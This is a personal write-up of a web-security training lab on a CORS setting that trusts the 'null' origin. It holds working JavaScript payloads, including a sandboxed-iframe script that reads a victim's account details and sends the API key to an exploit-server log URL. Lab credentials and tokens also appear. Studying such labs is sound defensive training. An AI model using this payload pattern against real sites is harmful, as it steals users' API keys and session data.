@@ -1,0 +1,91 @@
+Lab #2 - CORS vulnerability with trusted null origin
+
+vulnerability - This website has an insecure CORS configuration in that it trusts the "null" origin.
+
+Goal - To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+
+Credentials - wiener:peter
+
+Analysis:
+- Log in with credentials - wiener:peter and see API key
+- create an HTML file and click view Exploit
+<p id="apikey">API KEY</p>
+<script>
+    fetch('https://0acf002b048f2d0880f1035f007200bc.web-security-academy.net/accountDetails', {
+        credentials:"include"
+    })
+    .then(a => a.json())
+    .then(b => document.getElementById("apikey").innerText = b.apikey);
+</script>
+
+=> see the response in Burp Suite: 
+HTTP/2 200 OK
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 149
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "d8Ewy2Gh4Fds4deXs1NV6UWVcOvEEuDV",
+  "sessions": [
+    "JIc0DDqKwpX3H2BgeICEA9BlMfBhTwIW"
+  ]
+}
+
+==> But in the web page, we can't see API Key of this account => This origin is not allowed by CORS
+
+- Send this request to Burp Repeater and change Origin: null and try to send the request again 
+==> See the response and it contains Access-Control-Allow-Origin: null ==> The whitelist contain null value
+HTTP/2 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 149
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "d8Ewy2Gh4Fds4deXs1NV6UWVcOvEEuDV",
+  "sessions": [
+    "JIc0DDqKwpX3H2BgeICEA9BlMfBhTwIW"
+  ]
+}
+==> try to make a request which Origin header is null.
+
+- create a form like this:
+<iframe sandbox="allow-scripts" srcdoc="
+<p id='apikey'>API KEY</p>
+<script>
+fetch('https://0acf002b048f2d0880f1035f007200bc.web-security-academy.net/accountDetails', {
+    credentials: 'include'
+})
+.then(r => r.json())
+.then(data => {
+    document.getElementById('apikey').innerText = data.apikey;
+})
+.catch(err => console.error(err));
+</script>
+"></iframe>
+==> can see API key when click View Exploit
+
+
+Solution:
+- create an HTML form like below, upload to explot server ==> delivery to victim.
+<iframe sandbox="allow-scripts" srcdoc="
+    <script>
+        fetch('https://0acf002b048f2d0880f1035f007200bc.web-security-academy.net/accountDetails', {
+            credentials: 'include'
+        })
+        .then(r => r.text())
+        .then(data => {
+            fetch('https://exploit-0a3a00d104712d6180d002db016c00ad.exploit-server.net/log?data=' + data);
+        })
+        .catch(err => console.error(err));
+    </script>
+"></iframe>
+
+==> monitor in ACCESS LOG and see the API KEY of administrator: lxVmvlTz5lbmLC37XJBfSlOia8avK4fg
+
